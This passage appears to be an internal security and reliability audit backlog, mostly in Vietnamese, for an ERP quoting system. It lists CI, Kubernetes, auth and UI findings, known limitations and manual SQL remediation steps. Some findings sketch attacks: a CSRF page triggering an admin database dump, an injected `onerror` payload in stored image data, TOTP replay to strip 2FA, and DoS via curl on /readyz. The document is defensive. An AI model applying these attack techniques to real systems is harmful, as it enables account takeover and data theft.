| `no-docker-build-on-pr` | CI không hề `docker build` trên pull request — Dockerfile hỏng chỉ lộ SAU khi đã merge vào master | PR sửa Dockerfile (đổi base image, thêm `apk add`, đổi đường COPY) merge xanh mượt; `build-image` mới chạy sau merge, và lúc đó master đã đỏ. Cụ thể lớp lỗi mà CI hiện KHÔNG bắt: Dockerfile:… |
| `no-container-image-vuln-scan` | Trivy chỉ quét filesystem của repo, không quét IMAGE — CVE tầng base node:22-alpine không bao giờ bị soi | `trivy fs` đọc package-lock.json và cấu hình IaC; nó KHÔNG thấy gói hệ điều hành trong image: openssl, libc6-compat, tini, postgresql16-client, font-dejavu (Dockerfile:59) và toàn bộ layer a… |
| `actions-not-sha-pinned` | Toàn bộ GitHub Action ghim theo tag di động, gồm `anchore/sbom-action@v0` trong đúng job có quyền packages:write | `@v0`/`@v4` là tag Git có thể trỏ lại commit bất kỳ. Chiếm được repo của một action (đã có tiền lệ tj-actions/changed-files 2025) là chiếm được job đang cầm GITHUB_TOKEN có packages:write → … |
| `kubeconform-download-unverified` | CI tải kubeconform bằng curl rồi thực thi, không kiểm checksum | Nhị phân tuỳ ý được tải và chạy trên runner mỗi lần CI. Tài khoản upstream bị chiếm hoặc asset bị thay là toàn bộ CI của repo chạy mã lạ. `curl -sSL` không có `--fail` nên một trang lỗi HTML… |
| `k8s-worker-no-termination-grace` | infra/k8s/worker.yaml thiếu terminationGracePeriodSeconds (mặc định 30s) trong khi Helm đặt 60s — job export dài bị SIGKILL giữa chừng | Rolling update / node drain trên k8s: kubelet gửi SIGTERM, worker.ts:161 gọi shutdown và block chờ job export Excel đang chạy. Sau đúng 30s kubelet gửi SIGKILL. Job xuất workbook nhiều sheet… |
| `k8s-no-poddisruptionbudget` | infra/k8s không có PodDisruptionBudget nào — Helm có, kustomize thì `kubectl drain` hạ sạch cả 2 replica | `kubectl drain node-1` khi cả 2 pod quanly-app (infra/k8s/app.yaml:8 `replicas: 2`) tình cờ nằm cùng node — vốn RẤT dễ vì app.yaml cũng không có podAntiAffinity, khác Helm (app-deployment.ya… |
| `worker-pdb-blocks-drain` | PDB worker minAvailable=1 trùng với HPA minReplicas=1 → `kubectl drain` treo vĩnh viễn | Lúc tải thấp HPA hạ worker về đúng 1 replica. PDB đòi luôn có ≥1 worker sẵn sàng → API eviction từ chối evict pod worker duy nhất. `kubectl drain <node>` không bao giờ hoàn tất; nâng cấp nod… |
| `no-prestop-drain-delay` | App không có preStop hook — server đóng listener ngay khi nhận SIGTERM, request đang bay bị reset trong lúc rolling update | k8s gửi SIGTERM và xoá pod khỏi Endpoints SONG SONG, không tuần tự. kube-proxy/ingress-nginx cần vài trăm ms tới vài giây mới cập nhật xong bảng NAT. Trong khoảng đó ingress vẫn gửi request … |
| `helm-embedded-datastores-unhardened` | Postgres/Redis nhúng trong Helm chart không có securityContext nào — chạy root, rootfs ghi được, đủ capability; bản kustomize thì đã siết | `helm install` với mặc định (postgres.enabled/redis.enabled đều true, values.yaml:66,74) dựng một Postgres chứa toàn bộ dữ liệu ERP chạy bằng root với rootfs ghi được và full capability. Cụm… |
| `no-migration-drift-or-destructive-gate` | CI không có gác trôi schema (`migrate diff`) lẫn gác SQL huỷ dữ liệu, dù repo đã có migration DROP COLUMN/TABLE | Hai lỗ riêng biệt. (1) TRÔI SCHEMA: sửa prisma/schema.prisma mà quên sinh migration — `migrate deploy` trên DB rỗng vẫn xanh nếu bộ test không chạm đúng cột đó; lên prod, `migrate deploy` là… |
| `sbom-not-attached-and-latest-tag-pushed` | SBOM chỉ là workflow artifact (hết hạn 90 ngày), không gắn vào image; đồng thời vẫn đẩy tag di động `latest` lên ghcr | Ba tháng sau, một CVE mới công bố. Image đang chạy prod tương ứng một digest cũ; artifact SBOM của run đó đã bị GitHub xoá theo retention → phải đoán từ package-lock.json của commit nào đó, … |
| `dev-compose-publishes-datastores-on-all-interfaces` | docker-compose.yml (dev) mở Postgres/Redis/MinIO ra 0.0.0.0 với mật khẩu mặc định trong file | `docker compose up` trên laptop hoặc VM dev nối Tailscale/Wi-Fi công ty là mở cổng 5432 ra toàn bộ mạng LAN với cặp quanly/quanly_pwd. DB dev của hệ ERP này thường được restore từ dump prod … |
| `audit-not-append-only-actorid-nulled` | Nhật ký kiểm toán KHÔNG append-only: admin purge xoá cứng User làm AuditEvent.actorId bị set NULL hàng loạt | Một tài khoản bị vô hiệu hoá 30 ngày trước, chưa từng tạo báo giá/khách hàng (đúng hồ sơ của tài khoản bị lạm dụng rồi khoá), lọt qua mọi guard và bị xoá cứng. Postgres im lặng NULL hoá acto… |
| `env-schema-drift-secrets-undocumented` | .env.example thiếu gần hết biến bắt buộc/quan trọng; nhiều biến chỉ đọc thẳng process.env, không qua schema | Người dựng lại hệ thống (kịch bản DR ở docs/DR-runbook.md:28 nói "điền `.env`") không có nguồn nào liệt kê đủ biến: .env.example thiếu, docker-compose.prod.yml chỉ có dòng comment nói "toàn … |
| `retain-audit-days-unvalidated` | RETAIN_AUDIT_DAYS: nút xoá nhật ký kiểm toán, không nằm trong schema, không kiểm giá trị, chạy tự động hằng ngày | `RETAIN_AUDIT_DAYS=-1` (gõ nhầm, hoặc ai đó nghĩ số âm nghĩa là "tắt") cho `days(-1)` = NGÀY MAI → điều kiện `createdAt < ngày mai` đúng với MỌI dòng → 03:00 hôm sau xoá sạch toàn bộ nhật ký… |
| `api-process-crashes-never-reach-sentry` | Tiến trình API không báo crash lên Sentry và không flush khi tắt — trong khi worker thì có đủ | Lỗi lọt ra ngoài errorHandler — timer, callback stream (ví dụ stream pg_dump ở src/routes/admin.routes.ts:88-94), promise trong `void`/`.then()` như src/db.ts:76 hay src/server.ts:36 — chỉ h… |
| `webhook-sign-throws-outside-try` | Ký webhook nằm NGOÀI try → xoay MFA_ENC_KEY làm mọi webhook chết lặng, không có dòng delivery nào để admin thấy | Sau khi xoay MFA_ENC_KEY, mọi webhook ngừng gửi. Admin mở màn hình Deliveries (src/routes/webhooks.routes.ts:64-68 → webhookService.ts:42-48) và thấy... không có gì mới — không phải hàng lỗi… |
| `metrics-unreachable-shipped-scrape-config` | /metrics không thể scrape được với chính cấu hình giám sát repo ship: prod fail-closed 404, ServiceMonitor không mang token | Hai nhánh, cả hai đều mù: không đặt METRICS_TOKEN → prod trả 404 cho mọi lần scrape; đặt METRICS_TOKEN → ServiceMonitor scrape không kèm bearer → 401. Toàn bộ số liệu đã dựng công phu trong … |
| `prom-route-label-drops-baseurl` | Nhãn `route` của Prometheus bỏ mất baseUrl → mọi `router.get("/")` gộp chung một chuỗi số liệu | Trên dashboard, `http_request_duration_seconds{route="/"}` trộn lẫn danh sách báo giá, tìm kiếm toàn cục, danh sách khách hàng, nhật ký kiểm toán và webhook thành một histogram duy nhất. Khi… |
| `readyz-unauthenticated-unlimited-db-query` | /readyz chạy truy vấn CSDL, công khai qua tunnel, không giới hạn tần suất | Vài nghìn request/giây vào /readyz (một dòng curl) chiếm hết 20 kết nối của pool; mọi request /api thật sau đó xếp hàng chờ kết nối rồi timeout. Endpoint không tốn kém gì để gọi nhưng mỗi lầ… |
| `sentry-receives-webhook-job-payload-pii` | Payload job (dữ liệu khách hàng/báo giá) được gửi nguyên vẹn sang Sentry khi job lỗi | Mỗi lần một webhook đích trả 500 hoặc timeout (chuyện bình thường với tích hợp bên thứ ba), toàn bộ payload — tên khách hàng, thông tin liên hệ, dữ liệu báo giá — được gửi ra dịch vụ Sentry … |
| `payment-proof-read-not-audited` | Xem ảnh chứng từ thanh toán (chứng cứ tài chính) không để lại dấu vết, trong khi tải hợp đồng thì có | Ảnh chứng từ là ảnh uỷ nhiệm chi / màn hình chuyển khoản — chứa số tài khoản, tên chủ tài khoản, số tiền. Ai xem, xem hồ sơ của ai, lúc nào: không có dữ liệu. Khi có tranh chấp chi trả hoặc … |
| `missing-limiters-token-endpoints` | Thiếu limiter riêng cho các endpoint đoán token và cho truy vấn nặng (search, analytics) | Token mời/reset là 48 ký tự hex (authService.ts:121) nên không brute-force được về mặt toán học, nhưng 120 req/phút không giới hạn cho phép quét liên tục và, quan trọng hơn, không có tín hiệ… |
| `broken-e2e-hr-script` | `npm run e2e:hr` points at e2e-hr.mjs, which does not exist and can never be committed | A new clone runs `npm run e2e:hr` and gets `Error: Cannot find module '/…/e2e-hr.mjs'` with exit 1. There is exactly one npm script in the file that references a path outside the repo, and i… |
| `env-example-dead-dr-pointer` | .env.example points operators at docs/DR-runbook.md, which the docs restructure moved — the two pointers that matter most for unrecoverable data loss are dead | .env.example:95 is the note telling an operator that losing `PII_ENC_KEY` permanently destroys every encrypted CCCD/bank-account/salary field, and .env.example:77 is the note that a `pg_dump… |
| `codex-security-336mb-postinstall` | A 336 MB vendored Codex binary is pulled by a dev-only scanner CI never runs, plus a 503-line postinstall hook that only does anything on Windows | Every CI run downloads ~672 MB of a Codex CLI binary that no CI step executes, and the Docker `build` stage downloads it a third time into a layer that is then thrown away. The postinstall t… |
| `paintsel-quadratic` | paintSel dò DOM O(hàng²) — Ctrl+A / Ctrl+Space / kéo chọn trên sheet vài trăm dòng làm treo giao diện | Sheet 800 dòng × 8 cột dữ liệu. Bấm Ctrl+A để copy cả bảng: 6.400 lần querySelector, mỗi lần quét tối đa 800 <tr> ≈ 5 triệu phép so khớp thuộc tính → tab đứng vài giây. Vùng chọn còn giữ sau… |
| `extra-table-delete-no-confirm` | Xoá cả một sheet BẢNG NỘI BỘ (chi phí HCM / HN / phí KH) chỉ bằng một cú bấm ✕, không hỏi, không undo | Kế toán muốn chuyển từ tab "Bảng 1" sang "Bảng 2" của Chi Phí HCM, bấm trượt vào ✕ ngay bên phải nhãn. Cả bảng chi phí HCM (vài chục dòng nhân công/vật tư + trạng thái duyệt + đánh dấu thanh… |
| `legacy-grid-no-formula-shift` | SPA cũ (/app, đường lui + iframe nhúng) KHÔNG dịch tham chiếu công thức khi copy/dán hay chèn/xoá hàng → cùng báo giá cho ra tổng khác app React | Mở báo giá ở /app (đường lui khi bản React lỗi), copy hàng có "=E7*G7" ở hàng 7 rồi dán xuống hàng 12: ô mới vẫn là "=E7*G7" → nhân số lượng/đơn giá của hạng mục hàng 7, ra tiền của dòng khá… |
| `api-json-parse-unguarded` | lib/api.ts JSON.parse thân trả về không bọc try/catch → lỗi proxy (502/504/413 HTML) thoát ra dạng SyntaxError, bỏ qua cả nhánh xử lý 401 | Lúc Coolify redeploy hoặc nginx trả 502/504, thân là HTML. Người dùng bấm "Lưu" báo giá → `JSON.parse("<html>…")` ném SyntaxError → nhánh 409 ở QuoteEditor.tsx:241 không khớp → toast hiện "C… |
| `image-lightbox-window-open-datauri` | "Bấm để xem lớn" ảnh trong lưới không hoạt động — trình duyệt chặn điều hướng cấp cao nhất tới data: URL | Sheet bật cột HÌNH ẢNH, mỗi hạng mục có thumbnail 44px. Người dùng bấm ảnh để xem chi tiết (đúng như tooltip mời gọi) → tab mới trắng trơn, hoặc bị popup-blocker chặn. Không có cách nào khác… |
| `accounthn-no-optimistic-lock` | Màn hình "Phần Giá Hà Nội" lưu đè không kiểm tra xung đột — khoá lạc quan 409 chỉ có ở QuoteEditor | Account HN mở báo giá lúc 9:00 và điền dần 3 bảng HN. 9:20 sale mở cùng báo giá ở editor chính, sửa hạng mục rồi Lưu. 9:35 Account HN bấm 💾 Lưu — request đi thẳng, không mốc, ghi đè lên bản … |
| `meta-inputs-force-full-grid-rerender` | Ô VAT / Giảm giá / Ngày / Tên sheet gọi redraw() mỗi phím → vẽ lại TOÀN BỘ GridTable (không memo, không throttle) | Sheet 600 dòng. Kế toán gõ ô "Giảm giá" số 3500000 (7 phím) → 7 lần setTick → 7 lần vẽ lại ~4.800 ô của GridTable, mỗi lần cỡ 40-70ms theo chính đo đạc ghi trong comment → nuốt phím, con trỏ… |

## P3 — 30 mục

| Mục | Vấn đề | Hệ quả nếu đúng |
|---|---|---|
| `logout-leaves-refresh-tokens-alive` | POST /api/auth/logout destroys the cookie session but leaves every refresh token of that user valid | A user who has used both surfaces from the same device — the SPA cookie plus a token obtained from POST /api/auth/token (src/routes/auth.routes.ts:303) — clicks "Đăng xuất", sees the UI log … |
| `no-absolute-session-lifetime` | Cookie sessions roll forever — 7-day idle timeout with no maximum age, though `authAt` is already recorded and could enforce one | An internal ERP holding payroll and invoice data has no re-authentication boundary at all: a session token captured today (browser profile copy on a shared PC, an exfiltrated `user_sessions`… |
| `mfa-disable-totp-replay` | The intra-window TOTP replay guard is applied at login but not on /api/mfa/disable, so a code just used to log in can be replayed to strip 2FA | A 6-digit code is valid across a ±1 step window (~90 s). An attacker who observes one code in that window — shoulder-surfing the authenticator, a phishing page that relays the login, a compr… |
| `username-email-case-sensitivity` | Login/invite lookups are byte-exact, so email casing splits one human into two accounts and locks the other out with a generic 401 | Two failure modes, both real for an internal tool where accounts are created by typing an address into an invite form. (1) An admin invites `Nam.Tran@giaNguyen.vn` today and `nam.tran@giangu… |
| `personnel-paymentproof-prefix-regex-legacy-fallback` | Personnel paymentProof uses the same prefix-only regex; the migration fallback serves the un-re-encoded legacy column verbatim | Rows written before the object-storage migration were validated by this same prefix-only regex, so `PersonnelRecord.paymentProof` can legitimately hold `data:image/png;base64,AAAA" onerror=.… |
| `admin-backup-dump-side-effecting-get` | GET /api/admin/backup.dump spawns pg_dump and writes an audit row — a side-effecting GET, which csrfGuard exempts by design and SameSite=Lax cookies do accompany | An admin (or anyone holding settings:manage) visits an attacker page; a click handler does `location = "https://gianguyen.cloud/api/admin/backup.dump"`. Lax sends `qly.sid`, csrfGuard waves … |
| `file-upload-endpoints-no-capability-permission` | 3 endpoint ghi của /api/files chỉ đòi đăng nhập, không đòi quyền nào — kế toán/nhân sự/account_hn đều bơm được file vào kho object | Tài khoản vai trò `hr` (quyền mặc định duy nhất: personnel:read:all — src/permissions.ts:301) hoặc `account_hn` không có nghiệp vụ nào cần tải tệp, nhưng vẫn POST /api/files được. Một phiên … |
| `writemerged-bypasses-neutralize` | Nhánh chữ ký cuối báo giá ghi thẳng vào ô, không qua setCell/neutralizeFormula (hiện đang tắt bằng cờ — là bẫy chờ) | Bật `showSender: true` — một dòng cấu hình, đúng thứ người ta sửa khi khách đòi in tên người gửi — làm `quote.fromContact` / `fromTitle` / `fromPhone` (người dùng nhập tự do, src/validators.… |
| `docx-bare-wp-marker` | cutSection/dropParagraphWith khớp thẻ <w:p> TRẦN — Word lưu lại mẫu một lần là hỏng âm thầm, phiếu chi bị giữ cho hồ sơ CHƯA thanh toán | Hiện chạy đúng chỉ vì mẫu tình cờ có đúng 2 thẻ trần ở đúng 2 chỗ. Bất kỳ ai mở templates/hd-dichvu-template.docx bằng Word rồi Lưu (việc bình thường khi sửa mẫu hợp đồng) — Word viết lại `<… |
| `webp-logo-silently-dropped` | Logo WEBP được zod chấp nhận nhưng excel.ts bỏ qua im lặng, để lại chữ placeholder của mẫu trong file gửi khách | Khách gửi logo .webp (định dạng mặc định khi lưu ảnh từ Chrome). Thuộc tính `accept` của input chỉ là gợi ý — hệ điều hành vẫn cho chọn — và API thì chấp nhận, UI hiện logo bình thường. Nhưn… |
| `session-store-second-unbounded-pool` | connect-pg-simple mở pool pg THỨ HAI không đặt max — ngân sách kết nối mỗi tiến trình là 30, không ai khai báo | Mỗi tiến trình web chiếm tới 30 kết nối Postgres (20 Prisma + 10 session), worker thêm 20. Nâng `DB_POOL_MAX` (đúng như chú thích ở `src/db.ts:22-24` mời gọi) mà không tính pool session sẽ v… |
| `emitchange-broadcast-not-authz-filtered` | emitChange broadcasts entity/action/id to every connected user — the same leak class that was already fixed for presence | Any logged-in account — including `account_hn`, which is explicitly barred from seeing pricing (src/routes/export.routes.ts:22-27) — can sit on the SSE stream and record that quote id 4711 w… |
| `queue-dead-code-and-readyz-blind` | createQueueEvents is dead code and exportGateStats is exported but never used, so /readyz stays green on a saturated app pod | A pod whose export gate is completely full (3 active + 20 queued, exportQueue.ts:98-99) is answering /api/export/* with 503 for everyone, yet /readyz returns `{ ok: true }` (app.ts:290), so … |
| `extratables-drop-quantityexact` | sanitizeExtraTables silently drops quantityExact, so internal-table totals shift on save and the UI number stops matching the DB number | An internal HCM row with quantity 0,9075 and quantityExact=true shows 1.996.500 đ in the editor (4-decimal path). On save the flag is discarded; the reload recomputes with qtyRound → 0,9 → 1… |
| `hn-view-leaks-paidproof` | The account_hn presenter is the only quote view that does not strip base64 payment proofs | Every GET /api/quotes/:id by an account_hn user ships the full base64 receipt images of all hanoi rows — up to 900 KB each (src/routes/quotes.routes.ts:160) — to a role that holds neither qu… |
| `manual-number-desyncs-counter` | A client-supplied quoteNumber never advances the counter, so later automatic allocations collide and can 409 after burning the retry budget | Counter is at GN26005. Someone manually enters GN26010 … GN26014 for five back-dated quotes (the field is optional and accepted, src/validators.ts:183). The counter is still at 5. The next f… |
| `savable-but-unexportable-quotes` | The save validator allows 3x more items than the synchronous export will accept, so a user can build a quote they can never export | A user builds the owner-described 50 sheets × 500 rows quote (25,000 items). It saves (under the 60/1000 caps). Then Xuất Excel returns 413 "Báo giá quá lớn để xuất trực tiếp — vui lòng dùng… |
| `upload-objects-have-no-stored-hash` | uploads/ and exports/ objects store no content hash, so backup integrity can only ever be verified for payment proofs | After a bucket restore from the mirror, silent bit-rot or a partial `mc mirror` in an attachment or an export is undetectable — there is no recorded digest to compare against. The manifest s… |
| `dead-e2e-script-and-playwright-dep` | package.json trỏ tới e2e-hr.mjs không tồn tại; playwright là devDependency nhưng không có test nào dùng | `npm run e2e:hr` gãy ngay với MODULE_NOT_FOUND. playwright kéo về hàng trăm MB mỗi lần `npm ci` ở job test (ci.yml:90) và job security (ci.yml:251), chậm CI mà không kiểm gì. Quan trọng hơn … |
| `compose-mutable-tags-and-no-log-rotation` | Compose dùng tag di động (:latest, :16-alpine, :7-alpine) và không giới hạn log — đĩa VM prod đầy dần | (1) `docker compose pull` bất kỳ lúc nào có thể kéo postgres:16-alpine bản patch mới, khởi động lại prod với binary khác mà không ai chủ ý — trái với chính sách bất biến mà chart đang thi hà… |
| `session-secret-or-makes-min32-inert` | `z.string().min(32).or(z.string().min(1))` làm min(32) VÔ HIỆU hoàn toàn và nuốt mất thông báo lỗi đã soạn | Hai hậu quả thật. (1) Người vận hành đặt SESSION_SECRET rỗng nhận đúng dòng `- SESSION_SECRET: Invalid input` — không biết phải sửa gì; câu hướng dẫn đã viết sẵn thì bị union nuốt. (2) Ở dev… |
| `dead-config-vars` | Biến cấu hình chết: WEBHOOK_SECRET không nơi nào đọc; STRIPE_* trong Helm không tồn tại trong code | WEBHOOK_SECRET nằm trong schema tạo ấn tượng có cơ chế xác thực webhook vào — người bảo trì sau sẽ đặt giá trị cho nó rồi tin là đã bật một lớp bảo vệ không hề tồn tại. STRIPE_* còn tệ hơn: … |
| `request-id-unvalidated-from-client` | req.id lấy thẳng từ header client, không giới hạn độ dài/ký tự, rồi dội lại vào response header và log | Hai hệ quả cụ thể. (1) Client tự chọn reqId nghĩa là nhiều request khác nhau có thể mang cùng một id — khi truy vết một sự cố, việc lọc theo reqId trả về lẫn lộn request của kẻ tấn công lẫn … |
| `demo-seed-hardcoded-password-no-prod-guard` | Mật khẩu demo hard-code trong repo và seed demo thiếu chốt NODE_ENV mà hai script phá huỷ khác đều có | Chỉ cần một dòng lệnh gõ nhầm trong thư mục repo trên VM prod với `.env` prod đang nạp (`ALLOW_DEMO_SEED=1 npm run seed:demo`) là tạo hàng loạt tài khoản trên CSDL production với mật khẩu "G… |
| `dead-exports-src` | Four exported symbols in src/ have zero references anywhere in the repo, including their own file | `exportGateStats` is the visible cost: a reader adding export-queue observability finds a ready-made stats function, wires it up, and ends up publishing the same numbers twice under two nami… |
| `unused-prod-deps` | pdf-fontkit (4.2 MB) and nanoid ship in the production image with zero importers | Both land in the runtime layer of the production image and in `npm audit --omit=dev --audit-level=high` (.github/workflows/ci.yml:242), which gates merges. A future HIGH advisory against eit… |
| `unreferenced-root-and-scripts` | editor.png plus four operational scripts are reachable from nothing — no npm script, no CI step, no Dockerfile, no doc | `editor.png` is 155 KB of tracked binary that every clone and every `git archive` in deploy.sh:36 carries to both servers for no reason, and it is the kind of file nobody dares delete becaus… |
| `sheet-tabs-not-keyboard-operable` | Tab sheet + nút ✕ trong bản React là <div>/<span> chỉ có onClick — mất khả năng dùng bàn phím so với SPA cũ, aria-pressed đặt sai chỗ | Người chỉ dùng bàn phím (hoặc trình đọc màn hình) mở báo giá nhiều sheet: Tab đi qua toàn bộ ô lưới nhưng không bao giờ dừng ở tab sheet → không chuyển được sang sheet 2, cũng không xoá được… |
| `img-src-not-validated-react` | Bản React bỏ lớp safeLogoSrc cho ảnh hạng mục / ảnh chứng từ — chỉ còn server làm chốt duy nhất, mà regex chứng từ chỉ khớp TIỀN TỐ | Hôm nay chưa thành XSS vì React gán src qua thuộc tính DOM (không nội suy chuỗi vào HTML) nên không thoát được dấu nháy. Nhưng đã mất một tầng phòng thủ: chỉ cần một chỗ sau này render ảnh b… |
| `import-modal-usememo-defeated` | useMemo tính diff LCS của modal Nhập-Excel bị vô hiệu vì 3 prop hàm là arrow inline | Mỗi lần QuoteEditor render lại trong lúc modal mở (đổi checkbox "Áp dụng tổng", bật/tắt "chỉ hiện dòng khác", chọn sheet đích) thì `view` chạy lại `toGridItems` + `diffItems` (LCS O(n·m)). F… |

---

## Hạn chế đã biết của hệ thống (không phải lỗi, là đánh đổi)

Những cái này là lựa chọn có chủ ý, ghi ra để không ai phải phát hiện lại:

- **`style-src 'unsafe-inline'` vẫn bật** — hai SPA render rất nhiều `style=""`.
  Bỏ nó đòi refactor hàng trăm chỗ. `script-src` thì đã `'self'` thuần.
- **Presence SSE là in-process** — nhiều replica thì danh sách "ai đang sửa"
  không đầy đủ. Bản thân sự kiện SSE thì đã lan qua Redis Pub/Sub.
- **Chưa có tổng hợp log tập trung** (Loki hoặc tương đương). Log dừng ở stdout.
- **Chưa có Prometheus/Grafana chạy production** — nên mọi mục tiêu độ trễ trong
  [operations/SLO.md](operations/SLO.md) còn là giả định, chưa phải số đo.
- **Chưa có E2E trình duyệt trong CI** — clipboard, IME tiếng Việt và undo/redo
  chỉ được bảo vệ bởi test đơn vị trên hàm phân tích.
- **Rate limit bỏ qua khi Redis chết** — đánh đổi có chủ ý; khoá tài khoản khi
  sai mật khẩu nhiều lần nằm ở CSDL nên vẫn còn.
- **VM production là điểm hỏng đơn** — xem
  [operations/DEPLOYMENT.md](operations/DEPLOYMENT.md).

---

## Còn nợ sau đợt siết xác thực (cụm auth-session, 2026-08-26)

Ba việc dưới đây KHÔNG được vá bằng mã trong đợt này. Ghi ra vì mỗi cái đều là
rủi ro đang chạy thật, không phải giả định.

- **Mã dự phòng MFA CŨ vẫn còn nguyên trong CSDL và vẫn dùng được.** Bản vá tăng
  entropy (`src/mfa.ts`: `randomBytes(5)` → `randomBytes(10)`, băm SHA-256 trần →
  bcrypt) chỉ áp cho mã **sinh mới**. Người đã bật MFA trước bản vá vẫn giữ 8 mã
  40 bit băm SHA-256 KHÔNG MUỐI, và `consumeBackupCode` cố ý còn nhận chúng để
  không khoá họ ra khỏi tài khoản. Không có đường tự nâng cấp: mã cũ chỉ biến mất
  khi người dùng **tắt rồi bật lại MFA**. Ai lấy được một bản dump CSDL quét cạn
  không gian 2^40 trong vài giờ trên một GPU, rồi dùng mã tìm ra để VƯỢT và TẮT
  MFA — mà mã dự phòng không bị vô hiệu khi đổi mật khẩu, nên nó là thông tin
  đăng nhập sống rất dai.
  **Việc phải làm bằng tay:** yêu cầu mọi tài khoản có `mfaEnabled = true` từ
  trước 2026-08-26 tắt rồi bật lại MFA (hoặc viết một endpoint sinh lại mã dự
  phòng). Danh sách:
  `SELECT id, username FROM "User" WHERE "mfaEnabled" AND EXISTS (SELECT 1 FROM unnest("mfaBackupCodes") c WHERE c !~ '^\$2');`
- **Không có endpoint admin nào gỡ / đặt lại MFA hộ người dùng.** Từ khi
  `/accept-invite` có cổng MFA, người bật MFA mà mất thiết bị **và** mất luôn mã
  dự phòng thì không còn đường phục hồi nào trong sản phẩm — giao diện đã được vá
  để nhập được mã dự phòng ở cả màn đăng nhập lẫn màn đặt-lại-mật-khẩu, nhưng ai
  mất cả hai thì phải nhờ người có quyền vào CSDL:
  `UPDATE "User" SET "mfaEnabled" = false, "mfaSecret" = NULL, "mfaBackupCodes" = '{}', "mfaLastStep" = NULL WHERE username = '...';`
  (sau đó thu hồi refresh token của tài khoản đó). Nên làm hẳn một endpoint có
  ghi nhật ký kiểm toán thay cho thao tác tay này.
- **`POST /auth/logout` thu hồi MỌI refresh token của tài khoản**, không riêng
  phiên đang đăng xuất. Hôm nay vô hại vì chưa client nào dùng `/auth/token`.
  Khi có client di động thì đăng xuất trên điện thoại sẽ giết luôn quyền gọi API
  của máy tính (còn cookie máy tính thì vẫn sống) — hành vi bất đối xứng, cần
  thu hồi theo HỌ token của đúng phiên đó.
- **Bật trần tuổi thọ tuyệt đối cho phiên cookie sẽ ĐÁ MỌI NGƯỜI ĐANG ĐĂNG NHẬP
  RA ĐÚNG MỘT LẦN, ngay lần triển khai đầu tiên.** `enforceActiveUser`
  (`src/middleware.ts`, `SESSION_MAX_AGE_DAYS = 30`) huỷ phiên khi
  `Date.now() - session.authAt` vượt trần, **và cũng huỷ phiên KHÔNG có
  `authAt`** — fail-closed, vì chọn hướng ngược lại thì xoá một khoá trong phiên
  là vô hiệu hoá được chốt. `authAt` chỉ được đặt trong `establishSession`, nên
  mọi phiên sinh ra trước bản vá đều thiếu nó. **Việc phải làm:** báo trước cho
  người dùng là họ phải đăng nhập lại một lần sau lần triển khai này; các lần
  triển khai sau không còn hiện tượng đó. Chưa đo trên production (không có
  Docker/cluster trong môi trường phát triển) — mới chỉ chứng minh bằng test tích
  hợp `tests/authsess-session-absolute-ttl.test.js` chạy qua express-session thật.

## Chứng từ thanh toán di sản — cần một lần chạy TRÊN PRODUCTION

`PersonnelRecord.paymentProof` (base64 trong CSDL) đã được thay bằng kho object từ
migration `20260811200000_payment_proof_object`, nhưng migration đó **chỉ thêm cột** —
việc chuyển dữ liệu nằm ở script chạy tay `scripts/migration/payment-proof-migrate.mjs`.

Đợt này đã vá phần **mã**: hai route ghi (`/api/quotes/:id/extra/:sheetId/:rid/pay`,
`/api/personnel/:id/payment`) nay kiểm data-URL **toàn chuỗi** thay vì chỉ tiền tố, và
`readProofDataUrl` (`src/paymentProof.ts`) trả `null` + ghi log cảnh báo nếu giá trị di
sản không phải data-URL ảnh hợp lệ. Đo được bằng `tests/qua-proof-dataurl.test.js`.

**Chưa kiểm chứng được ở đây:** có bao nhiêu hàng di sản còn lại trên production, và
trong đó có hàng nào thực sự chứa chuỗi dị dạng hay không — môi trường phát triển
không có dữ liệu thật. Bản vá là **hỏng-an-toàn** (ảnh dị dạng biến mất khỏi giao
diện) chứ không sửa dữ liệu, nên nếu có hàng hợp lệ-nhưng-lạ (ví dụ base64 xuống dòng)
thì người dùng sẽ thấy "chưa có ảnh chứng từ" thay vì ảnh.

**Việc phải làm:**

```sql
-- 1) còn bao nhiêu hàng chưa chuyển
SELECT count(*) FROM "PersonnelRecord" WHERE "paymentProof" IS NOT NULL;
-- 2) trong đó bao nhiêu hàng KHÔNG khớp kiểm toàn chuỗi (sẽ bị trả null sau bản vá)
SELECT id FROM "PersonnelRecord"
 WHERE "paymentProof" IS NOT NULL
   AND "paymentProof" !~* '^data:image/(png|jpe?g|webp);base64,[A-Za-z0-9+/]+={0,2}$';
```

Chạy `scripts/migration/payment-proof-migrate.mjs`, xác minh truy vấn (1) trả về 0, rồi
mới bỏ cột cũ ở một migration riêng.

## Lưu được 60.000 dòng nhưng xuất đồng bộ chỉ tới 20.000 — ngõ cụt cho người dùng

`src/validators.ts:270` cho **60 trang** × `:194` **1000 dòng/trang** = tối đa
**60.000 item** một báo giá. Đường xuất đồng bộ `src/routes/export.routes.ts:35-41`
lại từ chối từ **20.000 item** (trả 413 ở `:67` và `:105`) với lời nhắn "vui lòng
dùng xuất nền (async)". Nhưng **không client nào gọi đường nền**: `grep -rn
"api/jobs\|/jobs" web/src` không ra kết quả nào — route `POST /api/quotes/:id/export`
(`src/routes/jobs.routes.ts:17`) chỉ có thể gọi bằng tay, và nó còn trả 503 nếu
thiếu Redis hoặc kho object. Người dùng lưu được báo giá rồi mới phát hiện không
tải được, không có cảnh báo nào từ trước.

**Trần 20.000 KHÔNG nên nâng.** Đo trên máy này (Node 22, `buildQuoteBuffer`,
template `marico_decor`, 1000 dòng/trang):

| Kích thước | Thời gian | File | RSS sau |
|---|---|---|---|
| 5.000 item | 2,6 s | 2,5 MB | 172 MB |
| 20.000 item | 7,7 s | 10,1 MB | 270 MB |
| 60.000 item | 20,8 s | 30,7 MB | 393 MB |

20,8 giây chặn event loop cho một request là không chấp nhận được, nên chốt chặn
hiện tại đúng — vấn đề nằm ở phía LƯU và phía giao diện, không phải ở phía xuất.

**Chưa xảy ra trong thực tế:** tải trọng thật theo tài liệu là 50 trang × 200 dòng
= 10.000 item, tức mới dùng một nửa headroom. Vì vậy đây là mục **UX/headroom**,
không phải lỗi đang gây hại.

**Việc phải làm (một trong hai, chưa làm ở đợt này vì nằm ngoài cụm excel/pdf):**
đưa `MAX_EXPORT_SHEETS`/`MAX_EXPORT_ITEMS` vào `src/config.ts` cho cả hai phía đọc
chung rồi cảnh báo ngay lúc lưu trong `src/services/quoteService.ts`; **hoặc** nối
nút "Xuất Excel" ở `web/src` với `POST /api/jobs` khi gặp 413 (chỉ có ích nếu
production đã bật Redis + kho object).

## Logo khách hàng định dạng .webp vẫn KHÔNG hiện trong file Excel

`src/validators.ts:132` và `web/src/pages/NewQuoteWizard.tsx:15` đều chấp nhận
